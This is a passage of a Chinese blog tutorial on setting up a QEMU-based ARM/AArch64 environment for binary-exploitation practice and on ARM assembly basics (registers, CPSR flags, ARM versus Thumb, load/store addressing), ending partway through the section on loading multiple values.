    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">ARM pwn 环境搭建+基础入门</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-29 19:51:41" itemprop="dateCreated datePublished" datetime="2022-08-29T19:51:41+08:00">2022-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-09 18:33:59" itemprop="dateModified" datetime="2022-12-09T18:33:59+08:00">2022-12-09</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="ARM-架构简述"><a href="#ARM-架构简述" class="headerlink" title="ARM 架构简述"></a>ARM 架构简述</h2><p>ARM 架构，过去称作进阶精简指令集机器（Advanced RISC Machine，更早称作艾康精简指令集机器， Acorn RISC Machine），是一个精简指令集（RISC）处理器架构家族，其广泛地使用在许多嵌入式系统设计 </p>
<p>ARM程序，指在ARM系统中正在执行的程序，而非保存在ROM中的bin文件</p>
<p>ARM 和 x86 之间的更多区别是：</p>
<ul>
<li>在 ARM 中，大多数指令都可用于条件执行。</li>
<li>英特尔 x86 和 x86-64 系列处理器使用小端格式</li>
<li>ARM 架构在低版本是小端的，之后，ARM 处理器成为 <strong>BL端</strong>（有允许可切换字节序的设置，由程序状态寄存器 CPSR 的位9 (E位) 控制）</li>
</ul>
<p>一个ARM程序包含3部分：</p>
<ul>
<li>RO段（只读）：RO是程序中的指令和常量</li>
<li>RW段（可读写）：RW是程序中已初始化的变量</li>
<li>ZI段（可读写）：ZI是程序中未初始化的变量</li>
</ul>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>安装 qemu-user：（用于开启虚拟机）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br><span class="line">sudo apt-get install qemu-use-binfmt qemu-user-binfmt:i386</span><br></pre></td></tr></table></figure>
<p>安装交叉编译工具 aarch64-linux-gnu-gcc：（推荐）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure>
<p>安装交叉编译工具链 arm-linux-gcc-4.3.3：（不推荐）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fshare%2Finit%3Fsurl%3DbpEq2Mr">arm-linux-gcc-4.4.3.tar.gz</a></li>
<li>百度云盘，密码：1gtt</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/local/arm_4.4.3</span><br><span class="line">sudo cp -r ./opt/FriendlyARM/toolschain/4.4.3/* /usr/local/arm_4.4.3</span><br><span class="line">gedit ~/.zshrc</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/usr/local/arm_4.4.3/bin</span><br></pre></td></tr></table></figure>
<p>安装 qemu 内核：（最好不要 <code>apt-get</code> 直接安装，因为没有 <code>qemu-system-aarch64</code>）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-6.2.0.tar.xz</span><br><span class="line">tar xvJf qemu-6.2.0.tar.xz</span><br><span class="line">cd qemu-6.2.0</span><br><span class="line">./configure --target-list=aarch64-softmmu</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>获取 ubuntu-18.04-server-arm64.iso：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://old-releases.ubuntu.com/releases/18.04.3/">http://old-releases.ubuntu.com/releases/18.04.3/</a> </li>
</ul>
<p>下载对应架构（aarch64）的 UEFI 固件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://releases.linaro.org/components/kernel/uefi-linaro/16.02/release/qemu64/QEMU_EFI.fd</span><br></pre></td></tr></table></figure>
<p>创建虚拟机硬盘：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create ubuntuimg.img 40G</span><br></pre></td></tr></table></figure>
<p>创建虚拟机：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-aarch64 -m 2048 -cpu cortex-a57 -smp 2 -M virt -bios QEMU_EFI.fd -nographic -drive if=none,file=ubuntu-18.04-server-arm64.iso,id=cdrom,media=cdrom -device virtio-scsi-device -device scsi-cd,drive=cdrom -drive if=none,file=ubuntuimg.img,id=hd0 -device virtio-blk-device,drive=hd0</span><br></pre></td></tr></table></figure>
<p>直接回车选择安装 Ubuntu Server：</p>
<p><img src="/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1661655283051.png" alt="1661655283051"> </p>
<p>安装成功后，就可以通过如下命令开启 ARM 程序：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/aarch64-linux-gnu ./[pwn] -g 1234</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./[pwn] -g 1234</span><br></pre></td></tr></table></figure>
<p>最后介绍一下调试方法：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch [pwn] </span><br><span class="line">set architecture [Arch-name] # aarch64 or arm</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51760563/article/details/119935101">使用qemu搭建ARM64架构虚拟机</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38406667/article/details/107367971">Ubuntu下arm-linux-gdb的安装</a> </li>
</ul>
<h2 id="数据类型和寄存器"><a href="#数据类型和寄存器" class="headerlink" title="数据类型和寄存器"></a>数据类型和寄存器</h2><p>与高级语言类似，ARM 支持对不同数据类型的操作</p>
<p>我们可以加载（或存储）的数据类型可以是有符号和无符号单词，半字或字节，这些数据类型的扩展名是：</p>
<ul>
<li>-h 或 -sh 表示半字</li>
<li>-b 或 -sb 表示一字节</li>
<li>没有扩展名表示一字</li>
</ul>
<p>有符号数据类型和无符号数据类型之间的区别在于：</p>
<ul>
<li>有符号数据类型 (+s) 可以同时包含正值和负值，因此范围较小</li>
<li>无符号数据类型 (+0) 可以保存较大的正值（包括“零”），但不能保存负值，因此范围更广</li>
</ul>
<p>以下是如何将这些数据类型与加载和存储说明一起使用的一些示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldr = Load Word</span><br><span class="line">ldrh = Load unsigned Half Word</span><br><span class="line">ldrsh = Load signed Half Word</span><br><span class="line">ldrb = Load unsigned Byte</span><br><span class="line">ldrsb = Load signed Bytes</span><br><span class="line"></span><br><span class="line">str = Store Word</span><br><span class="line">strh = Store unsigned Half Word</span><br><span class="line">strsh = Store signed Half Word</span><br><span class="line">strb = Store unsigned Byte</span><br><span class="line">strsb = Store signed Byte</span><br></pre></td></tr></table></figure>
<p>寄存器的数量取决于ARM版本</p>
<p>根据ARM参考手册，除了基于 <code>ARMv6-M</code> 和 <code>ARMv7-M</code> 的处理器外，都有30个通用的32位寄存器，其中的 <code>r0-r15</code> 作用如下表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>标号</th>
<th>别名</th>
<th style="text-align:left">目的</th>
</tr>
</thead>
<tbody>
<tr>
<td>R0</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R1</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R2</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R3型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R4型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R5</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R6型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R7型</td>
<td>–</td>
<td style="text-align:left">持有系统调用号</td>
</tr>
<tr>
<td>R8型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R9型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R10型</td>
<td>–</td>
<td style="text-align:left">一般用途</td>
</tr>
<tr>
<td>R11型</td>
<td>FP</td>
<td style="text-align:left">帧指针</td>
</tr>
<tr>
<td>R12</td>
<td>IP</td>
<td style="text-align:left">程序内呼叫</td>
</tr>
<tr>
<td>R13</td>
<td>SP</td>
<td style="text-align:left">栈指针</td>
</tr>
<tr>
<td>R14</td>
<td>LR</td>
<td style="text-align:left">链接注册</td>
</tr>
<tr>
<td>R15</td>
<td>PC</td>
<td style="text-align:left">程序计数器</td>
</tr>
<tr>
<td>CPSR</td>
<td>–</td>
<td style="text-align:left">当前程序状态寄存器</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><strong>R0-R12：</strong>可在常见操作期间用于存储临时值、指针（到内存的位置）等<ul>
<li>R0 在算术运算期间可以称为累加器，或者用于存储以前调用的函数的结果</li>
<li>R7 在使用系统调用时变得很有用，因为它存储了 syscall 编号</li>
<li>R11 帮助我们跟踪栈上的边界，作为帧指针（稍后将介绍）</li>
<li>R0-R3：ARM 上的函数调用约定指定函数的前四个参数存储在寄存器 r0-r3 中</li>
</ul>
</li>
<li><strong>R13：SP</strong>（栈指针）栈指针指向栈的顶部<ul>
<li>栈是用于特定于函数的存储的内存区域，当函数返回时，将回收该内存区域</li>
<li>因此，栈指针用于分配栈上的空间，方法是从栈指针中减去我们要分配的值（以字节为单位），换句话说，如果我们想分配一个32位值，我们从栈指针中减去“4”</li>
</ul>
</li>
<li><strong>R14：LR</strong>（链路寄存器）进行函数调用时，链接寄存器将使用内存地址进行更新，该内存地址引用从中启动函数的下一条指令<ul>
<li>这样做允许程序返回到在“子”函数完成后启动“子”函数调用的“父”函数</li>
</ul>
</li>
<li><strong>R15：PC</strong>（程序计数器）程序计数器按执行的指令的大小自动递增<ul>
<li>此大小在 <code>ARM</code> 状态下始终为4个字节，在 <code>THUMB</code> 模式下始终为2个字节</li>
<li>当执行分支指令时，PC保存目标地址，在执行过程中，PC 将当前指令加 8（两条 ARM 指令）的地址存储在 <code>ARM</code> 状态，将当前指令加 4（两条拇指指令）的地址存储在 <code>Thumb(v1)</code> 状态</li>
<li>PS：这与x86不同，在x86中，PC 始终指向要执行的下一条指令</li>
</ul>
</li>
</ul>
<p><strong>CPSR：</strong>显示当前程序状态寄存器（CPSR）的值</p>
<ul>
<li>在此值下，您可以看到标志 &gt;&gt; <code>thumb, fast, interrupt, overflow, carry, zero, and negative</code></li>
<li>这些标志表示 CPSR 寄存器中的某些位，并根据 CPSR 的值进行设置，并在激活时变为 <strong>粗体</strong></li>
<li>N、Z、C 和 V 位与 x86 上 EFLAG 寄存器中的 SF、ZF、CF 和 OF 位相同，它们将用于支持程序集级别的条件和循环中的条件执行：<ul>
<li><strong>N</strong> – 当操作结果为负时设置</li>
<li><strong>Z</strong> – 当操作结果为零时设置</li>
<li><strong>C</strong> – 判断无符号数是否溢出</li>
<li><strong>V</strong> – 判断带符号数是否溢出</li>
</ul>
</li>
</ul>
<p><img src="/2022/08/29/ARM%20pwn%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1661586815885.png" alt="1661586815885"> </p>
<p>下表展示了 CPSR 中各个位的具体作用：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">Flag</th>
<th style="text-align:left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">N<br>(Negative)</td>
<td style="text-align:left">如果指令结果产生负数，则启用</td>
</tr>
<tr>
<td style="text-align:left">Z<br>(Zero)</td>
<td style="text-align:left">如果指令的结果产生零值，则启用</td>
</tr>
<tr>
<td style="text-align:left">C<br>(Carry)</td>
<td style="text-align:left">如果指令的结果产生一个需要完全表示第 33 位的值，则启用该值</td>
</tr>
<tr>
<td style="text-align:left">V<br>(Overflow)</td>
<td style="text-align:left">如果指令的结果产生的值不能用 32 位 2 的补码表示，则启用此选项</td>
</tr>
<tr>
<td style="text-align:left">E<br>(Endian-bit)</td>
<td style="text-align:left">ARM可以在小端序或大端中进行切换，对于小字节序，此位设置为“0”，对于大字节序模式，此位设置为“1”</td>
</tr>
<tr>
<td style="text-align:left">T<br>(Thumb-bit)</td>
<td style="text-align:left">如果您处于 Thumb 状态，则设置此位，并在您处于 ARM 状态时被禁用</td>
</tr>
<tr>
<td style="text-align:left">M<br>(Mode-bits)</td>
<td style="text-align:left">这些位指定当前权限模式（USR、SVC 等）</td>
</tr>
<tr>
<td style="text-align:left">J<br>(Jazelle)</td>
<td style="text-align:left">第三个执行状态，允许某些 ARM 处理器在硬件中执行 Java 字节码</td>
</tr>
</tbody>
</table>
</div>
<h2 id="ARM-amp-THUMB"><a href="#ARM-amp-THUMB" class="headerlink" title="ARM &amp; THUMB"></a>ARM &amp; THUMB</h2><p>ARM 处理器有两种主要状态，它们可以在其中运行（这里不算Jazelle）：ARM 和 Thumb</p>
<ul>
<li>Thumb 是 ARM 体系结构中一种 <strong>16位的指令集</strong></li>
<li>Thumb 指令集可以看作是 ARM 指令压缩形式的子集，它是为减小代码量而提出，具有16bit的代码密度</li>
</ul>
<p>这些状态与权限级别无关，例如，在 SVC 模式下运行的代码可以是 ARM 或 Thumb，这两种状态之间的主要区别在于指令集，其中 ARM 状态下的指令始终为32位，而 Thumb 状态的指令为16位（但可以是32位）</p>
<p>了解何时以及如何使用 Thumb 对于我们的 ARM 漏洞利用开发目的尤为重要，在编写 ARM 外壳代码时，我们需要删除 NULL 字节，并使用 16 位 Thumb 指令而不是 32 位 ARM 指令来降低拥有它们的机会</p>
<p>如前所述，有不同的 Thumb 版本，不同的命名只是为了将它们彼此区分开来：（处理器本身将始终将其称为 Thumb）</p>
<ul>
<li>Thumb-1（16 位指令）：用于 ARMv6 和早期架构</li>
<li>Thumb-2（16 位和 32 位指令）：通过添加更多指令并允许它们为 16 位或 32 位宽（ARMv6T2、ARMv7）来扩展 Thumb-1</li>
<li>ThumbEE：包括一些针对动态生成的代码（在执行前或执行期间在设备上编译的代码）的一些更改和添加</li>
</ul>
<p>ARM 和 Thumb 之间的区别：</p>
<ul>
<li>条件执行：<ul>
<li>ARM 状态下的所有指令都支持条件执行，某些 ARM 处理器版本允许使用 IT 指令在 Thumb 中执行条件（条件执行导致更高的代码密度，因为它减少了要执行的指令数量，并减少了昂贵的分支指令的数量）</li>
</ul>
</li>
<li>32 位 ARM 和 Thumb 指令：<ul>
<li>32 位 Thumb 指令具有 .w 后缀</li>
<li>32 位 ARM 指令没有</li>
</ul>
</li>
<li>桶形移位器：<ul>
<li>是另一个独特的 ARM 模式功能，它可用于将多个指令缩小为一个</li>
</ul>
</li>
</ul>
<p>要切换处理器执行的状态，必须满足以下两个条件之一：</p>
<ul>
<li>我们可以使用分支指令BX（分支和交换）或BLX（分支，链路和交换），并将目标寄存器的最低有效位设置为1<ul>
<li>这可以通过将1添加到偏移量（如0x5530 + 1）来实现</li>
<li>您可能会认为这会导致对齐问题，因为指令是 2 字节或 4 字节对齐的</li>
<li>不够都这不是问题，因为处理器将忽略最低有效位</li>
</ul>
</li>
<li>我们知道，如果当前程序状态寄存器中的 T 位已设置，则处于 Thumb 模式</li>
</ul>
<h2 id="ARM-指令集"><a href="#ARM-指令集" class="headerlink" title="ARM 指令集"></a>ARM 指令集</h2><p>汇编语言由指令组成，这些指令是主要的构建块，ARM 指令后面通常跟一个或两个操作数，通常使用以下模板： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC&#123;S&#125;&#123;condition&#125; &#123;Rd&#125;, Operand1, Operand2</span><br></pre></td></tr></table></figure>
<p>由于 ARM 指令集的灵活性，并非所有指令都使用模板中提供的所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MNEMONIC - 指令的简称(助记符)</span><br><span class="line">&#123;S&#125; - 可选后缀,如果指定了S,则条件标志会根据操作结果更新</span><br><span class="line">&#123;condition&#125; - 执行指令需要满足的条件</span><br><span class="line">&#123;Rd&#125; - 用于存储指令结果的寄存器(目标)</span><br><span class="line">Operand1 - 第一个操作数,寄存器或立即数</span><br><span class="line">Operand2 - 第二个(灵活的)操作数,可以是立即数(数字)或带有可选移位的寄存器</span><br></pre></td></tr></table></figure>
<p>虽然 MNEMONIC、S、Rd 和 Operand1 字段是直截了当的，但条件和 Operand2 字段需要进一步澄清：</p>
<ul>
<li>条件字段与 CPSR 寄存器的值紧密相关，或者更确切地说，与寄存器中特定位的值紧密相关</li>
<li>Operand2 被称为灵活的操作数，因为我们可以以各种形式使用它：<ul>
<li>作为即时值（具有有限的值集）</li>
<li>寄存器</li>
<li>以移位寄存器</li>
</ul>
</li>
<li>例如，我们可以将这些表达式用作操作数 2：  </li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#123 - 立即值(具有有限的一组值)</span></span><br><span class="line"><span class="attribute">Rx</span> - 寄存器 x(如 R<span class="number">1</span>、R<span class="number">2</span>、R<span class="number">3</span> ...)</span><br><span class="line"><span class="attribute">Rx</span>, ASR n - 寄存器 x 算术右移 n 位 (<span class="number">1</span> = n = <span class="number">32</span>)</span><br><span class="line"><span class="attribute">Rx</span>, LSL n - 寄存器 x 逻辑左移 n 位 (<span class="number">0</span> = n = <span class="number">31</span>)</span><br><span class="line"><span class="attribute">Rx</span>, LSR n - 寄存器 x 逻辑右移 n 位 (<span class="number">1</span> = n = <span class="number">32</span>)</span><br><span class="line"><span class="attribute">Rx</span>, ROR n - 寄存器 x 右移 n 位 (<span class="number">1</span> = n = <span class="number">31</span>)</span><br><span class="line"><span class="attribute">Rx</span>, RRX - 寄存器 x 右移一位,扩展</span><br></pre></td></tr></table></figure>
<ul>
<li>作为不同类型说明的快速示例，让我们看一下以下列表：</li>
</ul>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ADD</span> R<span class="number">0</span>, R<span class="number">1</span>, R<span class="number">2</span> - 将 R<span class="number">1</span> (Operand<span class="number">1</span>) 和 R<span class="number">2</span> (Operand<span class="number">2</span> 的寄存器形式) 的内容相加并将结果存储到 R<span class="number">0</span> (Rd)</span><br><span class="line"><span class="attribute">ADD</span> R<span class="number">0</span>, R<span class="number">1</span>, #<span class="number">2</span> - 将 R<span class="number">1</span> (Operand<span class="number">1</span>) 的内容与值 <span class="number">2</span> (Operand<span class="number">2</span> 的立即数形式) 相加并将结果存储到 R<span class="number">0</span> (Rd)</span><br><span class="line"><span class="attribute">MOVLE</span> R<span class="number">0</span>, #<span class="number">5</span> - 仅当满足条件 LE (小于或等于)时,将数字 <span class="number">5</span> (操作数 <span class="number">2</span>,因为编译器将其视为 MOVLE R<span class="number">0</span>, R<span class="number">0</span>, #<span class="number">5</span>) 移动到 R<span class="number">0</span>(Rd)</span><br><span class="line"><span class="attribute">MOV</span> R<span class="number">0</span>, R<span class="number">1</span>, LSL #<span class="number">1</span> - 将 R<span class="number">1</span> 的内容(操作数 <span class="number">2</span> 采用逻辑左移的寄存器形式)左移一位到 R<span class="number">0</span>(Rd),因此,如果 R<span class="number">1</span> 的值为 <span class="number">2</span>,它会左移一位并变为 <span class="number">4</span>,然后将 <span class="number">4</span> 移至 R<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>作为快速摘要，让我们看一下我们将在以后的示例中使用的最常见的说明</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:left">描述</th>
<th style="text-align:center">指令</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">MOV</td>
<td style="text-align:left">Move data</td>
<td style="text-align:center">EOR</td>
<td style="text-align:left">Bitwise XOR</td>
</tr>
<tr>
<td style="text-align:center">MVN</td>
<td style="text-align:left">Move and negate</td>
<td style="text-align:center">LDR</td>
<td style="text-align:left">Load</td>
</tr>
<tr>
<td style="text-align:center">ADD</td>
<td style="text-align:left">Addition</td>
<td style="text-align:center">STR</td>
<td style="text-align:left">Store</td>
</tr>
<tr>
<td style="text-align:center">SUB</td>
<td style="text-align:left">Subtraction</td>
<td style="text-align:center">LDM</td>
<td style="text-align:left">Load Multiple</td>
</tr>
<tr>
<td style="text-align:center">MUL</td>
<td style="text-align:left">Multiplication</td>
<td style="text-align:center">STM</td>
<td style="text-align:left">Store Multiple</td>
</tr>
<tr>
<td style="text-align:center">LSL</td>
<td style="text-align:left">Logical Shift Left</td>
<td style="text-align:center">PUSH</td>
<td style="text-align:left">Push on Stack</td>
</tr>
<tr>
<td style="text-align:center">LSR</td>
<td style="text-align:left">Logical Shift Right</td>
<td style="text-align:center">POP</td>
<td style="text-align:left">Pop off Stack</td>
</tr>
<tr>
<td style="text-align:center">ASR</td>
<td style="text-align:left">Arithmetic Shift Right</td>
<td style="text-align:center">B</td>
<td style="text-align:left">Branch</td>
</tr>
<tr>
<td style="text-align:center">ROR</td>
<td style="text-align:left">Rotate Right</td>
<td style="text-align:center">BL</td>
<td style="text-align:left">Branch with Link</td>
</tr>
<tr>
<td style="text-align:center">CMP</td>
<td style="text-align:left">Compare</td>
<td style="text-align:center">BX</td>
<td style="text-align:left">Branch and eXchange</td>
</tr>
<tr>
<td style="text-align:center">AND</td>
<td style="text-align:left">Bitwise AND</td>
<td style="text-align:center">BLX</td>
<td style="text-align:left">Branch with Link and eXchange</td>
</tr>
<tr>
<td style="text-align:center">ORR</td>
<td style="text-align:left">Bitwise OR</td>
<td style="text-align:center">SWI/SVC</td>
<td style="text-align:left">System Call</td>
</tr>
</tbody>
</table>
</div>
<h2 id="加载和存储"><a href="#加载和存储" class="headerlink" title="加载和存储"></a>加载和存储</h2><p>ARM 使用 load-store 模型进行内存访问，这意味着只有 load/store（LDR 和 STR）指令才能访问内存，虽然在x86上允许大多数指令直接对内存中的数据进行操作，但在ARM上，<strong>数据必须在操作之前从内存移动到寄存器中</strong></p>
<p>这意味着在 ARM 上的特定内存地址递增 32 位值需要三种类型的指令（加载、递增和存储），首先将特定地址的值加载到寄存器中，在寄存器中递增，然后将其从寄存器存储回存储器</p>
<p>通常，<code>LDR</code> 用于将某些内容从内存加载到寄存器中，而 <code>STR</code> 用于将某些内容从寄存器存储到内存地址</p>
<p><strong>常规操作</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR R2, [R0] 	@ [R0]:原始地址是在 R0 中找到的值</span><br><span class="line">STR R2, [R1] 	@ [R1]:目标地址是在 R1 中找到的值</span><br></pre></td></tr></table></figure>
<ul>
<li>LDR 操作：将 R0 中找到的地址处的值加载到目标寄存器 R2</li>
<li>STR 操作：将 R2 中找到的值存储到 R1 中找到的内存地址</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR    Ra, [Rb, imm]</span><br><span class="line">LDR    Ra, [Rc, imm]</span><br></pre></td></tr></table></figure>
<ul>
<li>偏移形式为：使用立即（整数）作为偏移量</li>
<li><strong>偏移地址模式</strong>：先从基本寄存器 Ra 中添加或减去此值，然后再使用已知的偏移量访问数据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR    Ra, [Rb, Rc]</span><br><span class="line">LDR    Ra, [Rb, Rc]</span><br></pre></td></tr></table></figure>
<ul>
<li>偏移形式为：使用寄存器作为偏移（偏移地址模式）<ul>
<li>Rb 是基寄存器</li>
<li>Rc 是偏移</li>
</ul>
</li>
<li>使用场景：当您的代码想要访问在运行时计算索引的数组</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR    Ra, [Rb, Rc, &lt;shifter&gt;]</span><br><span class="line">STR    Ra, [Rb, Rc, &lt;shifter&gt;]</span><br></pre></td></tr></table></figure>
<ul>
<li>偏移形式为：具有缩放寄存器作为偏移（偏移地址模式）<ul>
<li>Rb 是基寄存器</li>
<li>Rc 是左/右移位（&lt; shifter &gt;）的即时偏移（或包含即时值的寄存器），以缩放即时偏移（这意味着桶形移位器用于缩放偏移）</li>
</ul>
</li>
<li>使用场景：循环以循环访问数组</li>
</ul>
<p><strong>特殊操作</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LDR r3, [r1], #offset</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>索引后地址模式</strong>：这意味着基寄存器（R1）用作最终地址，然后使用 R1 + 4 计算的失调进行更新</li>
<li>换句话说，它采用在 R1（不是 R1+4）中找到的值并将其加载到 R3 中，然后将 R1 更新为 R1 + offset</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADR r0, words+12             /* address of words[3] -&gt; r0 */</span><br></pre></td></tr></table></figure>
<ul>
<li>我们使用 ADR 指令（懒惰方法）来获取 <code>word[3]</code> 的地址放入 R0</li>
<li>PS：其实这两个都是伪指令<ul>
<li>ADR 是小范围的地址读取伪指令</li>
<li>LDR 是大范围的读取地址伪指令</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LDR r1, array_buff_bridge    /* address of array_buff[0] -&gt; r1 */</span><br><span class="line">LDR r2, array_buff_bridge+4  /* address of array_buff[2] -&gt; r2 */</span><br></pre></td></tr></table></figure>
<ul>
<li>执行上述两条指令后，R1 和 R2 包含 <code>array_buff[0]</code> 和 <code>array_buff[2]</code> 的地址</li>
<li>PS：对于数组，可以采用这种这种写法</li>
</ul>
<p><strong>同时处理多个值</strong></p>
<p>有时，一次加载（或存储）多个值会更有效，为此，我们使用 LDM（加载多个）和 STM（存储多个）指令：</p>
